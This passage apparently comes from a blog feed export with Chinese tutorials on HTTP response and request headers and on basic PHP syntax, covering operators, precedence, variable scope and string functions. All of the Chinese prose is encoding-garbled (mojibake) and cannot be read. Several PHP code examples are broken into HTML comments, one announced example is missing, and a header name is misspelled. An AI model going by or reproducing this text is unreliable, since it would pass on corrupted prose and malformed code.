eep-Aliveï¼šå¦‚æžœæµè§ˆå™¨è¯·æ±‚ä¿æŒè¿žæŽ¥ï¼Œåˆ™è¯¥å¤´éƒ¨è¡¨æ˜Žå¸Œæœ› WEB æœåŠ¡å™¨ä¿æŒè¿žæŽ¥å¤šé•¿æ—¶é—´ï¼ˆç§’ï¼‰ã€‚ä¾‹å¦‚ï¼šKeep-Aliveï¼š300</li></ul></li></ul><p>8ã€ Content-Encodingï¼šWEBæœåŠ¡å™¨è¡¨æ˜Žè‡ªå·±ä½¿ç”¨äº†ä»€ä¹ˆåŽ‹ç¼©æ–¹æ³•ï¼ˆgzipï¼Œdeflateï¼‰åŽ‹ç¼©å“åº”ä¸­çš„å¯¹è±¡ã€‚ä¾‹å¦‚ï¼šContent-Encodingï¼šgzip</p><p>9ã€Content-Languageï¼šWEB æœåŠ¡å™¨å‘Šè¯‰æµè§ˆå™¨è‡ªå·±å“åº”çš„å¯¹è±¡çš„è¯­è¨€ã€‚</p><p>10ã€Content-Lengthï¼š WEB æœåŠ¡å™¨å‘Šè¯‰æµè§ˆå™¨è‡ªå·±å“åº”çš„å¯¹è±¡çš„é•¿åº¦ã€‚ä¾‹å¦‚ï¼šContent-Length: 26012</p><p>11ã€Content-Rangeï¼š WEB æœåŠ¡å™¨è¡¨æ˜Žè¯¥å“åº”åŒ…å«çš„éƒ¨åˆ†å¯¹è±¡ä¸ºæ•´ä¸ªå¯¹è±¡çš„å“ªä¸ªéƒ¨åˆ†ã€‚ä¾‹å¦‚ï¼šContent-Range: bytes 21010-47021/47022</p><p>12ã€Content-Typeï¼š WEB æœåŠ¡å™¨å‘Šè¯‰æµè§ˆå™¨è‡ªå·±å“åº”çš„å¯¹è±¡çš„ç±»åž‹ã€‚ä¾‹å¦‚ï¼šContent-Typeï¼šapplication/xml</p><p>13ã€ ETagï¼šå°±æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ˆæ¯”å¦‚URLï¼‰çš„æ ‡å¿—å€¼ï¼Œå°±ä¸€ä¸ªå¯¹è±¡è€Œè¨€ï¼Œæ¯”å¦‚ä¸€ä¸ª html æ–‡ä»¶ï¼Œå¦‚æžœè¢«ä¿®æ”¹äº†ï¼Œå…¶ Etag ä¹Ÿä¼šè¢«ä¿®æ”¹ï¼Œæ‰€ä»¥ETag çš„ä½œç”¨è·Ÿ Last-Modified çš„ä½œç”¨å·®ä¸å¤šï¼Œä¸»è¦ä¾› WEB æœåŠ¡å™¨åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¦æ”¹å˜äº†ã€‚æ¯”å¦‚å‰ä¸€æ¬¡è¯·æ±‚æŸä¸ª html æ–‡ä»¶æ—¶ï¼ŒèŽ·å¾—äº†å…¶ ETagï¼Œå½“è¿™æ¬¡åˆè¯·æ±‚è¿™ä¸ªæ–‡ä»¶æ—¶ï¼Œæµè§ˆå™¨å°±ä¼šæŠŠå…ˆå‰èŽ·å¾—çš„ ETag å€¼å‘é€ç»™WEB æœåŠ¡å™¨ï¼Œç„¶åŽ WEB æœåŠ¡å™¨ä¼šæŠŠè¿™ä¸ª ETag è·Ÿè¯¥æ–‡ä»¶çš„å½“å‰ ETag è¿›è¡Œå¯¹æ¯”ï¼Œç„¶åŽå°±çŸ¥é“è¿™ä¸ªæ–‡ä»¶æœ‰æ²¡æœ‰æ”¹å˜äº†ã€‚</p><p>14ã€ Expiredï¼šWEBæœåŠ¡å™¨è¡¨æ˜Žè¯¥å®žä½“å°†åœ¨ä»€ä¹ˆæ—¶å€™è¿‡æœŸï¼Œå¯¹äºŽè¿‡æœŸäº†çš„å¯¹è±¡ï¼Œåªæœ‰åœ¨è·ŸWEBæœåŠ¡å™¨éªŒè¯äº†å…¶æœ‰æ•ˆæ€§åŽï¼Œæ‰èƒ½ç”¨æ¥å“åº”å®¢æˆ·è¯·æ±‚ã€‚æ˜¯ HTTP/1.0 çš„å¤´éƒ¨ã€‚ä¾‹å¦‚ï¼šExpiresï¼šSat, 23 May 2009 10:02:12 GMT</p><p>15ã€ Hostï¼šå®¢æˆ·ç«¯æŒ‡å®šè‡ªå·±æƒ³è®¿é—®çš„WEBæœåŠ¡å™¨çš„åŸŸå/IP åœ°å€å’Œç«¯å£å·ã€‚ä¾‹å¦‚ï¼šHostï¼šrss.sina.com.cn</p><p>16ã€ If-Matchï¼šå¦‚æžœå¯¹è±¡çš„ ETag æ²¡æœ‰æ”¹å˜ï¼Œå…¶å®žä¹Ÿå°±æ„å‘³è‘—å¯¹è±¡æ²¡æœ‰æ”¹å˜ï¼Œæ‰æ‰§è¡Œè¯·æ±‚çš„åŠ¨ä½œã€‚</p><p>17ã€If-None-Matchï¼šå¦‚æžœå¯¹è±¡çš„ ETag æ”¹å˜äº†ï¼Œå…¶å®žä¹Ÿå°±æ„å‘³è‘—å¯¹è±¡ä¹Ÿæ”¹å˜äº†ï¼Œæ‰æ‰§è¡Œè¯·æ±‚çš„åŠ¨ä½œã€‚</p><p>18ã€ If-Modified-Sinceï¼šå¦‚æžœè¯·æ±‚çš„å¯¹è±¡åœ¨è¯¥å¤´éƒ¨æŒ‡å®šçš„æ—¶é—´ä¹‹åŽä¿®æ”¹äº†ï¼Œæ‰æ‰§è¡Œè¯·æ±‚çš„åŠ¨ä½œï¼ˆæ¯”å¦‚è¿”å›žå¯¹è±¡ï¼‰ï¼Œå¦åˆ™è¿”å›žä»£ç 304ï¼Œå‘Šè¯‰æµè§ˆå™¨ è¯¥å¯¹è±¡æ²¡æœ‰ä¿®æ”¹ã€‚ä¾‹å¦‚ï¼šIf-Modified-Sinceï¼šThu, 10 Apr 2008 09:14:42 GMT</p><p>19ã€If-Unmodified-Sinceï¼šå¦‚æžœè¯·æ±‚çš„å¯¹è±¡åœ¨è¯¥å¤´éƒ¨æŒ‡å®šçš„æ—¶é—´ä¹‹åŽæ²¡ä¿®æ”¹è¿‡ï¼Œæ‰æ‰§è¡Œè¯·æ±‚çš„åŠ¨ä½œï¼ˆæ¯”å¦‚è¿”å›žå¯¹è±¡ï¼‰ã€‚</p><p>20ã€ If-Rangeï¼šæµè§ˆå™¨å‘Šè¯‰ WEB æœåŠ¡å™¨ï¼Œå¦‚æžœæˆ‘è¯·æ±‚çš„å¯¹è±¡æ²¡æœ‰æ”¹å˜ï¼Œå°±æŠŠæˆ‘ç¼ºå°‘çš„éƒ¨åˆ†ç»™æˆ‘ï¼Œå¦‚æžœå¯¹è±¡æ”¹å˜äº†ï¼Œå°±æŠŠæ•´ä¸ªå¯¹è±¡ç»™æˆ‘ã€‚æµè§ˆå™¨é€šè¿‡å‘é€è¯·æ±‚å¯¹è±¡çš„ ETag æˆ–è€… è‡ªå·±æ‰€çŸ¥é“çš„æœ€åŽä¿®æ”¹æ—¶é—´ç»™ WEB æœåŠ¡å™¨ï¼Œè®©å…¶åˆ¤æ–­å¯¹è±¡æ˜¯å¦æ”¹å˜äº†ã€‚æ€»æ˜¯è·Ÿ Range å¤´éƒ¨ä¸€èµ·ä½¿ç”¨ã€‚</p><p>21ã€ Last-Modifiedï¼šWEB æœåŠ¡å™¨è®¤ä¸ºå¯¹è±¡çš„æœ€åŽä¿®æ”¹æ—¶é—´ï¼Œæ¯”å¦‚æ–‡ä»¶çš„æœ€åŽä¿®æ”¹æ—¶é—´ï¼ŒåŠ¨æ€é¡µé¢çš„æœ€åŽäº§ç”Ÿæ—¶é—´ç­‰ç­‰ã€‚ä¾‹å¦‚ï¼šLast-Modifiedï¼šTue, 06 May 2008 02:42:43 GMT</p><p>22ã€ Locationï¼šWEB æœåŠ¡å™¨å‘Šè¯‰æµè§ˆå™¨ï¼Œè¯•å›¾è®¿é—®çš„å¯¹è±¡å·²ç»è¢«ç§»åˆ°åˆ«çš„ä½ç½®äº†ï¼Œåˆ°è¯¥å¤´éƒ¨æŒ‡å®šçš„ä½ç½®åŽ»å–ã€‚ä¾‹å¦‚ï¼šLocationï¼š<a href="http://i0.sinaimg.cn/">http://i0.sinaimg.cn</a> /dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif</p><p>23ã€ Pramgaï¼šä¸»è¦ä½¿ç”¨ Pramga: no-cacheï¼Œç›¸å½“äºŽ Cache-Control: no-cacheã€‚</p><p>24ã€ Proxy-Authenticateï¼š ä»£ç†æœåŠ¡å™¨å“åº”æµè§ˆå™¨ï¼Œè¦æ±‚å…¶æä¾›ä»£ç†èº«ä»½éªŒè¯ä¿¡æ¯ã€‚Proxy-Authorizationï¼šæµè§ˆå™¨å“åº”ä»£ç†æœåŠ¡å™¨çš„èº«ä»½éªŒè¯è¯·æ±‚ï¼Œæä¾›è‡ªå·±çš„èº«ä»½ä¿¡æ¯ã€‚</p><p>25ã€ Rangeï¼šæµè§ˆå™¨ï¼ˆæ¯”å¦‚ Flashget å¤šçº¿ç¨‹ä¸‹è½½æ—¶ï¼‰å‘Šè¯‰ WEB æœåŠ¡å™¨è‡ªå·±æƒ³å–å¯¹è±¡çš„å“ªéƒ¨åˆ†ã€‚ä¾‹å¦‚ï¼šRange: bytes=1173546-</p><p>26ã€ Refererï¼šæµè§ˆå™¨å‘ WEB æœåŠ¡å™¨è¡¨æ˜Žè‡ªå·±æ˜¯ä»Žå“ªä¸ª ç½‘é¡µ/URL èŽ·å¾—/ç‚¹å‡» å½“å‰è¯·æ±‚ä¸­çš„ç½‘å€/URLã€‚ä¾‹å¦‚ï¼šReferer:<a href="http://www.sina.com/">http://www.sina.com/</a></p><p>27ã€ Server: WEB æœåŠ¡å™¨è¡¨æ˜Žè‡ªå·±æ˜¯ä»€ä¹ˆè½¯ä»¶åŠç‰ˆæœ¬ç­‰ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼šServerï¼šApache/2.0.61 (Unix)</p><p>28ã€ User-Agent: æµè§ˆå™¨è¡¨æ˜Žè‡ªå·±çš„èº«ä»½ï¼ˆæ˜¯å“ªç§æµè§ˆå™¨ï¼‰ã€‚ä¾‹å¦‚ï¼šUser-Agentï¼šMozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2ã€0ã€0ã€14</p><p>29ã€ Transfer-Encoding: WEB æœåŠ¡å™¨è¡¨æ˜Žè‡ªå·±å¯¹æœ¬å“åº”æ¶ˆæ¯ä½“ï¼ˆä¸æ˜¯æ¶ˆæ¯ä½“é‡Œé¢çš„å¯¹è±¡ï¼‰ä½œäº†æ€Žæ ·çš„ç¼–ç ï¼Œæ¯”å¦‚æ˜¯å¦åˆ†å—ï¼ˆchunkedï¼‰ã€‚ä¾‹å¦‚ï¼šTransfer-Encoding: chunked</p><p>30ã€ Vary: WEBæœåŠ¡å™¨ç”¨è¯¥å¤´éƒ¨çš„å†…å®¹å‘Šè¯‰ Cache æœåŠ¡å™¨ï¼Œåœ¨ä»€ä¹ˆæ¡ä»¶ä¸‹æ‰èƒ½ç”¨æœ¬å“åº”æ‰€è¿”å›žçš„å¯¹è±¡å“åº”åŽç»­çš„è¯·æ±‚ã€‚å‡å¦‚æºWEBæœåŠ¡å™¨åœ¨æŽ¥åˆ°ç¬¬ä¸€ä¸ªè¯·æ±‚æ¶ˆæ¯æ—¶ï¼Œå…¶å“åº”æ¶ˆæ¯çš„å¤´éƒ¨ä¸ºï¼šContent- Encoding: gzip; Vary: Content-Encodingé‚£ä¹ˆ Cache æœåŠ¡å™¨ä¼šåˆ†æžåŽç»­è¯·æ±‚æ¶ˆæ¯çš„å¤´éƒ¨ï¼Œæ£€æŸ¥å…¶ Accept-Encodingï¼Œæ˜¯å¦è·Ÿå…ˆå‰å“åº”çš„ Vary å¤´éƒ¨å€¼ä¸€è‡´ï¼Œå³æ˜¯å¦ä½¿ç”¨ç›¸åŒçš„å†…å®¹ç¼–ç æ–¹æ³•ï¼Œè¿™æ ·å°±å¯ä»¥é˜²æ­¢ Cache æœåŠ¡å™¨ç”¨è‡ªå·± Cache é‡Œé¢åŽ‹ç¼©åŽçš„å®žä½“å“åº”ç»™ä¸å…·å¤‡è§£åŽ‹èƒ½åŠ›çš„æµè§ˆå™¨ã€‚ä¾‹å¦‚ï¼šVaryï¼šAccept-Encoding</p><p>31ã€ Viaï¼š åˆ—å‡ºä»Žå®¢æˆ·ç«¯åˆ° OCS æˆ–è€…ç›¸åæ–¹å‘çš„å“åº”ç»è¿‡äº†å“ªäº›ä»£ç†æœåŠ¡å™¨ï¼Œä»–ä»¬ç”¨ä»€ä¹ˆåè®®ï¼ˆå’Œç‰ˆæœ¬ï¼‰å‘é€çš„è¯·æ±‚ã€‚å½“å®¢æˆ·ç«¯è¯·æ±‚åˆ°è¾¾ç¬¬ä¸€ä¸ªä»£ç†æœåŠ¡å™¨æ—¶ï¼Œè¯¥æœåŠ¡å™¨ä¼šåœ¨è‡ªå·±å‘å‡ºçš„è¯·æ±‚é‡Œé¢æ·» åŠ  Via å¤´éƒ¨ï¼Œå¹¶å¡«ä¸Šè‡ªå·±çš„ç›¸å…³ä¿¡æ¯ï¼Œå½“ä¸‹ä¸€ä¸ªä»£ç†æœåŠ¡å™¨æ”¶åˆ°ç¬¬ä¸€ä¸ªä»£ç†æœåŠ¡å™¨çš„è¯·æ±‚æ—¶ï¼Œä¼šåœ¨è‡ªå·±å‘å‡ºçš„è¯·æ±‚é‡Œé¢å¤åˆ¶å‰ä¸€ä¸ªä»£ç†æœåŠ¡å™¨çš„è¯·æ±‚çš„Via å¤´éƒ¨ï¼Œå¹¶æŠŠè‡ªå·±çš„ç›¸å…³ä¿¡æ¯åŠ åˆ°åŽé¢ï¼Œä»¥æ­¤ç±»æŽ¨ï¼Œå½“ OCS æ”¶åˆ°æœ€åŽä¸€ä¸ªä»£ç†æœåŠ¡å™¨çš„è¯·æ±‚æ—¶ï¼Œæ£€æŸ¥ Via å¤´éƒ¨ï¼Œå°±çŸ¥é“è¯¥è¯·æ±‚æ‰€ç»è¿‡çš„è·¯ç”±ã€‚ä¾‹å¦‚ï¼šViaï¼š1.0 236.D0707195.sina.com.cn:80 (squid/2.6.STABLE13)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPï¼šåŸºæœ¬è¯­æ³•ï¼ˆ2ï¼‰</title>
      <link href="2021/07/16/php-ji-ben-yu-fa-2/"/>
      <url>2021/07/16/php-ji-ben-yu-fa-2/</url>
      
        <content type="html"><![CDATA[<p>1.PHP é€»è¾‘è¿ç®—ç¬¦</p><p><strong>è¿ç®—ç¬¦    åç§°    æè¿°    å®žä¾‹<br>x and y    ä¸Ž    å¦‚æžœ x å’Œ y éƒ½ä¸º trueï¼Œåˆ™è¿”å›ž true    x=6 y=3 (x &lt; 10 and y &gt; 1) è¿”å›ž true<br>x or y    æˆ–    å¦‚æžœ x å’Œ y è‡³å°‘æœ‰ä¸€ä¸ªä¸º trueï¼Œåˆ™è¿”å›ž true    x=6 y=3 (x==6 or y==5) è¿”å›ž true<br>x xor y    å¼‚æˆ–    å¦‚æžœ x å’Œ y æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªä¸º trueï¼Œåˆ™è¿”å›ž true    x=6 y=3 (x==6 xor y==3) è¿”å›ž false<br>x &amp;&amp; y    ä¸Ž    å¦‚æžœ x å’Œ y éƒ½ä¸º trueï¼Œåˆ™è¿”å›ž true    x=6 y=3(x &lt; 10 &amp;&amp; y &gt; 1) è¿”å›ž true<br>x || y    æˆ–    å¦‚æžœ x å’Œ y è‡³å°‘æœ‰ä¸€ä¸ªä¸º trueï¼Œåˆ™è¿”å›ž true    x=6 y=3(x==5 || y==5) è¿”å›ž false<br>! x    éž    å¦‚æžœ x ä¸ä¸º trueï¼Œåˆ™è¿”å›ž true    x=6y=3!(x==y) è¿”å›ž true<br>**2.PHP æ•°ç»„è¿ç®—ç¬¦</strong><br>è¿ç®—ç¬¦    åç§°    æè¿°<br>x + y    é›†åˆ    x å’Œ y çš„é›†åˆ<br>x == y    ç›¸ç­‰    å¦‚æžœ x å’Œ y å…·æœ‰ç›¸åŒçš„é”®/å€¼å¯¹ï¼Œåˆ™è¿”å›ž true<br>x === y    æ’ç­‰    å¦‚æžœ x å’Œ y å…·æœ‰ç›¸åŒçš„é”®/å€¼å¯¹ï¼Œä¸”é¡ºåºç›¸åŒç±»åž‹ç›¸åŒï¼Œåˆ™è¿”å›ž true<br>x != y    ä¸ç›¸ç­‰    å¦‚æžœ x ä¸ç­‰äºŽ yï¼Œåˆ™è¿”å›ž true<br>x &lt;&gt; y    ä¸ç›¸ç­‰    å¦‚æžœ x ä¸ç­‰äºŽ yï¼Œåˆ™è¿”å›ž true<br>x !== y    ä¸æ’ç­‰    å¦‚æžœ x ä¸ç­‰äºŽ yï¼Œåˆ™è¿”å›ž true<br>ä»¥ä¸‹å®žä¾‹æ¼”ç¤ºäº†ä½¿ç”¨ä¸€äº›æ•°ç»„è¿ç®—ç¬¦å¾—åˆ°çš„ä¸åŒç»“æžœï¼š</p><p>å®žä¾‹<br><!--?php$x = array("a" =--> "red", "b" =&gt; "green"); $y = array("c" =&gt; "blue", "d" =&gt; "yellow"); $z = $x + $y; // $x å’Œ $y æ•°ç»„åˆå¹¶var_dump($z);var_dump($x == $y);var_dump($x === $y);var_dump($x != $y);var_dump($x &lt;&gt; $y);var_dump($x !== $y);?&gt;</p><p><strong>3.ä¸‰å…ƒè¿ç®—ç¬¦</strong><br>å¦ä¸€ä¸ªæ¡ä»¶è¿ç®—ç¬¦æ˜¯â€?:â€ï¼ˆæˆ–ä¸‰å…ƒï¼‰è¿ç®—ç¬¦ ã€‚</p><p>è¯­æ³•æ ¼å¼</p><p>(expr1) ? (expr2) : (expr3)<br>å¯¹ expr1 æ±‚å€¼ä¸º TRUE æ—¶çš„å€¼ä¸º expr2ï¼Œåœ¨ expr1 æ±‚å€¼ä¸º FALSE æ—¶çš„å€¼ä¸º expr3ã€‚</p><p>è‡ª PHP 5.3 èµ·ï¼Œå¯ä»¥çœç•¥ä¸‰å…ƒè¿ç®—ç¬¦ä¸­é—´é‚£éƒ¨åˆ†ã€‚è¡¨è¾¾å¼ expr1 ?: expr3 åœ¨ expr1 æ±‚å€¼ä¸º TRUE æ—¶è¿”å›ž expr1ï¼Œå¦åˆ™è¿”å›ž expr3ã€‚</p><p>å®žä¾‹</p><p>ä»¥ä¸‹å®žä¾‹ä¸­é€šè¿‡åˆ¤æ–­ $_GET è¯·æ±‚ä¸­å«æœ‰ user å€¼ï¼Œå¦‚æžœæœ‰è¿”å›ž $_GET[â€˜userâ€™]ï¼Œå¦åˆ™è¿”å›ž nobodyï¼š</p><p><strong>4.ç»„åˆæ¯”è¾ƒç¬¦(PHP7+)</strong><br>PHP7+ æ”¯æŒç»„åˆæ¯”è¾ƒç¬¦ï¼ˆcombined comparison operatorï¼‰ä¹Ÿç§°ä¹‹ä¸ºå¤ªç©ºèˆ¹æ“ä½œç¬¦ï¼Œç¬¦å·ä¸º &lt;=&gt;ã€‚ç»„åˆæ¯”è¾ƒè¿ç®—ç¬¦å¯ä»¥è½»æ¾å®žçŽ°ä¸¤ä¸ªå˜é‡çš„æ¯”è¾ƒï¼Œå½“ç„¶ä¸ä»…é™äºŽæ•°å€¼ç±»æ•°æ®çš„æ¯”è¾ƒã€‚</p><p>è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p><p>$c = $a &lt;=&gt; $b;<br>è§£æžå¦‚ä¸‹ï¼š</p><p>å¦‚æžœ $a &gt; $b, åˆ™ $c çš„å€¼ä¸º 1ã€‚<br>å¦‚æžœ $a == $b, åˆ™ $c çš„å€¼ä¸º 0ã€‚<br>å¦‚æžœ $a &lt; $b, åˆ™ $c çš„å€¼ä¸º -1ã€‚<br>å®žä¾‹å¦‚ä¸‹ï¼š</p><p>å®žä¾‹<br>&lt;?php<br>// æ•´åž‹<br>echo 1 &lt;=&gt; 1; // 0<br>echo 1 &lt;=&gt; 2; // -1<br>echo 2 &lt;=&gt; 1; // 1</p><p>// æµ®ç‚¹åž‹<br>echo 1.5 &lt;=&gt; 1.5; // 0<br>echo 1.5 &lt;=&gt; 2.5; // -1<br>echo 2.5 &lt;=&gt; 1.5; // 1</p><p>// å­—ç¬¦ä¸²<br>echo â€œaâ€ &lt;=&gt; â€œaâ€; // 0<br>echo â€œaâ€ &lt;=&gt; â€œbâ€; // -1<br>echo â€œbâ€ &lt;=&gt; â€œaâ€; // 1<br>?&gt;</p><p><strong>5.è¿ç®—ç¬¦ä¼˜å…ˆçº§</strong><br>ä¸‹è¡¨æŒ‰ç…§ä¼˜å…ˆçº§ä»Žé«˜åˆ°ä½Žåˆ—å‡ºäº†è¿ç®—ç¬¦ã€‚åŒä¸€è¡Œä¸­çš„è¿ç®—ç¬¦å…·æœ‰ç›¸åŒä¼˜å…ˆçº§ï¼Œæ­¤æ—¶å®ƒä»¬çš„ç»“åˆæ–¹å‘å†³å®šæ±‚å€¼é¡ºåºã€‚</p><p>è¯´æ˜Žï¼šå·¦ ï¼ ä»Žå·¦åˆ°å³ï¼Œå³ ï¼ ä»Žå³åˆ°å·¦ã€‚</p><p>ç»“åˆæ–¹å‘    è¿ç®—ç¬¦    é™„åŠ ä¿¡æ¯<br>æ—     clone new    clone å’Œ new<br>å·¦    [    array()<br>å³    ++ â€“ ~ (int) (float) (string) (array) (object) (bool) @    ç±»åž‹å’Œé€’å¢žï¼é€’å‡<br>æ—     instanceof    ç±»åž‹<br>å³    !    é€»è¾‘è¿ç®—ç¬¦<br>å·¦    * / %    ç®—æœ¯è¿ç®—ç¬¦<br>å·¦    + â€“ .    ç®—æœ¯è¿ç®—ç¬¦å’Œå­—ç¬¦ä¸²è¿ç®—ç¬¦<br>å·¦    &lt;&lt; &gt;&gt;    ä½è¿ç®—ç¬¦<br>æ—     == != === !== &lt;&gt;    æ¯”è¾ƒè¿ç®—ç¬¦<br>å·¦    &amp;    ä½è¿ç®—ç¬¦å’Œå¼•ç”¨<br>å·¦    ^    ä½è¿ç®—ç¬¦<br>å·¦    |    ä½è¿ç®—ç¬¦<br>å·¦    &amp;&amp;    é€»è¾‘è¿ç®—ç¬¦<br>å·¦    ||    é€»è¾‘è¿ç®—ç¬¦<br>å·¦    ? :    ä¸‰å…ƒè¿ç®—ç¬¦<br>å³    = += -= *= /= .= %= &amp;= |= ^= &lt;&lt;= &gt;&gt;= =&gt;    èµ‹å€¼è¿ç®—ç¬¦<br>å·¦    and    é€»è¾‘è¿ç®—ç¬¦<br>å·¦    xor    é€»è¾‘è¿ç®—ç¬¦<br>å·¦    or    é€»è¾‘è¿ç®—ç¬¦<br>å·¦    ,    å¤šå¤„ç”¨åˆ°<br>è¿ç®—ç¬¦ä¼˜å…ˆçº§ä¸­ï¼Œor å’Œ ||ï¼Œ&amp;&amp; å’Œ and éƒ½æ˜¯é€»è¾‘è¿ç®—ç¬¦ï¼Œæ•ˆæžœä¸€æ ·ï¼Œä½†æ˜¯å…¶ä¼˜å…ˆçº§å´ä¸ä¸€æ ·ã€‚</p><p><strong>æ‹¬å·çš„ä½¿ç”¨</strong></p><p>æˆ‘ä»¬é€šè¿‡æ‹¬å·çš„é…å¯¹æ¥æ˜Žç¡®æ ‡æ˜Žè¿ç®—é¡ºåºï¼Œè€Œéžé è¿ç®—ç¬¦ä¼˜å…ˆçº§å’Œç»“åˆæ€§æ¥å†³å®šï¼Œé€šå¸¸èƒ½å¤Ÿå¢žåŠ ä»£ç çš„å¯è¯»æ€§ã€‚</p><p>å®žä¾‹<br>&lt;?php<br>// æ‹¬å·ä¼˜å…ˆè¿ç®—</p><p>$a = 1;<br>$b = 2;<br>$c = 3;<br>$d = $a + $b * $c;<br>echo $d;<br>echo â€œ\nâ€;<br>$e = ($a + $b) * $c; // ä½¿ç”¨æ‹¬å·<br>echo $e;<br>echo â€œ\nâ€;<br>?&gt;</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPï¼šåŸºæœ¬è¯­æ³•ï¼ˆ1ï¼‰</title>
      <link href="2021/07/16/php-ji-ben-yu-fa-1/"/>
      <url>2021/07/16/php-ji-ben-yu-fa-1/</url>
      
        <content type="html"><![CDATA[<p><strong>1.PHPè„šæœ¬ä»¥&lt;?phpå¼€å§‹ï¼Œ</strong></p><p>ä»¥?&gt;ç»“æŸ</p><p>phpä¸­çš„æ¯ä¸ªä»£ç è¡Œéƒ½å¿…é¡»ä»¥åˆ†å·ç»“æŸï¼Œç”¨äºŽæŠŠæŒ‡ä»¤é›†åŒºåˆ†å¼€æ¥ã€‚</p><p><strong>2.PHPå˜é‡</strong></p><p>å˜é‡æ˜¯ç”¨äºŽå­˜å‚¨ä¿¡æ¯çš„â€å®¹å™¨â€:</p><p>å®žä¾‹</p><!--?php$x=5;$y=6;$z=$x+$y;echo $z;?--><p>åœ¨PHPä¸­ï¼Œè¿™äº›å­—æ¯è¢«ç§°ä¸ºå˜é‡ã€‚å˜é‡æ˜¯ç”¨äºŽå­˜å‚¨æ•°æ®çš„å®¹å™¨ã€‚</p><p>PHP å˜é‡è§„åˆ™ï¼š</p><p>å˜é‡ä»¥ $ ç¬¦å·å¼€å§‹ï¼ŒåŽé¢è·Ÿç€å˜é‡çš„åç§°<br>å˜é‡åå¿…é¡»ä»¥å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿å­—ç¬¦å¼€å§‹<br>å˜é‡ååªèƒ½åŒ…å«å­—æ¯æ•°å­—å­—ç¬¦ä»¥åŠä¸‹åˆ’çº¿ï¼ˆA-zã€0-9 å’Œ _ ï¼‰<br>å˜é‡åä¸èƒ½åŒ…å«ç©ºæ ¼<br>å˜é‡åæ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼ˆ$y å’Œ $Y æ˜¯ä¸¤ä¸ªä¸åŒçš„å˜é‡ï¼‰</p><p><strong>3.PHPå˜é‡ä½œç”¨åŸŸ</strong></p><p>å˜é‡çš„ä½œç”¨åŸŸæ˜¯è„šæœ¬ä¸­å˜é‡å¯è¢«å¼•ç”¨çš„éƒ¨åˆ†</p><p>PHPæœ‰å››ç§ä¸åŒçš„å˜é‡ä½œç”¨åŸŸï¼š</p><p>local  global  static  parameter</p><p>å±€éƒ¨å’Œå…¨å±€ä½œç”¨åŸŸ<br>åœ¨æ‰€æœ‰å‡½æ•°å¤–éƒ¨å®šä¹‰çš„å˜é‡ï¼Œæ‹¥æœ‰å…¨å±€ä½œç”¨åŸŸã€‚é™¤äº†å‡½æ•°å¤–ï¼Œå…¨å±€å˜é‡å¯ä»¥è¢«è„šæœ¬ä¸­çš„ä»»ä½•éƒ¨åˆ†è®¿é—®ï¼Œè¦åœ¨ä¸€ä¸ªå‡½æ•°ä¸­è®¿é—®ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œéœ€è¦ä½¿ç”¨ global å…³é”®å­—ã€‚</p><p>åœ¨ PHP å‡½æ•°å†…éƒ¨å£°æ˜Žçš„å˜é‡æ˜¯å±€éƒ¨å˜é‡ï¼Œä»…èƒ½åœ¨å‡½æ•°å†…éƒ¨è®¿é—®</p><p>Static ä½œç”¨åŸŸ<br>å½“ä¸€ä¸ªå‡½æ•°å®Œæˆæ—¶ï¼Œå®ƒçš„æ‰€æœ‰å˜é‡é€šå¸¸éƒ½ä¼šè¢«åˆ é™¤ã€‚ç„¶è€Œï¼Œæœ‰æ—¶å€™æ‚¨å¸Œæœ›æŸä¸ªå±€éƒ¨å˜é‡ä¸è¦è¢«åˆ é™¤ã€‚</p><p>è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œè¯·åœ¨æ‚¨ç¬¬ä¸€æ¬¡å£°æ˜Žå˜é‡æ—¶ä½¿ç”¨ static å…³é”®å­—ï¼š</p><p>å®žä¾‹<br>&lt;?php<br>function myTest()<br>{<br>  static $x=0;<br>  echo $x;<br>  $x++;<br>  echo PHP_EOL;  // æ¢è¡Œç¬¦<br>}</p><p>myTest();<br>myTest();<br>myTest();<br>?&gt;</p><p><strong>4.PHP å¹¶ç½®è¿ç®—ç¬¦</strong><br>åœ¨ PHP ä¸­ï¼Œåªæœ‰ä¸€ä¸ªå­—ç¬¦ä¸²è¿ç®—ç¬¦ã€‚</p><p>å¹¶ç½®è¿ç®—ç¬¦ (.) ç”¨äºŽæŠŠä¸¤ä¸ªå­—ç¬¦ä¸²å€¼è¿žæŽ¥èµ·æ¥ã€‚</p><p>ä¸‹é¢çš„å®žä¾‹æ¼”ç¤ºäº†å¦‚ä½•å°†ä¸¤ä¸ªå­—ç¬¦ä¸²å˜é‡è¿žæŽ¥åœ¨ä¸€èµ·ï¼š</p><p>å®žä¾‹<br><!--?php $txt1="Hello world!"; $txt2="What a nice day!"; echo $txt1 . " " . $txt2; ?--><br>ä¸Šé¢çš„ä»£ç å°†è¾“å‡ºï¼šHello world! What a nice day!</p><p><strong>5.PHP strlen() å‡½æ•°</strong><br>æœ‰æ—¶çŸ¥é“å­—ç¬¦ä¸²å€¼çš„é•¿åº¦æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚</p><p>strlen() å‡½æ•°è¿”å›žå­—ç¬¦ä¸²çš„é•¿åº¦ï¼ˆå­—èŠ‚æ•°ï¼‰ã€‚</p><p>ä¸‹é¢çš„å®žä¾‹è¿”å›žå­—ç¬¦ä¸² â€œHello world!â€ çš„é•¿åº¦ï¼š</p><p>å®žä¾‹<br><!--?php echo strlen("Hello world!"); ?--></p><p>ä¸Šé¢çš„ä»£ç å°†è¾“å‡º12</p><p><strong>6.PHP strpos() å‡½æ•°</strong><br>strpos() 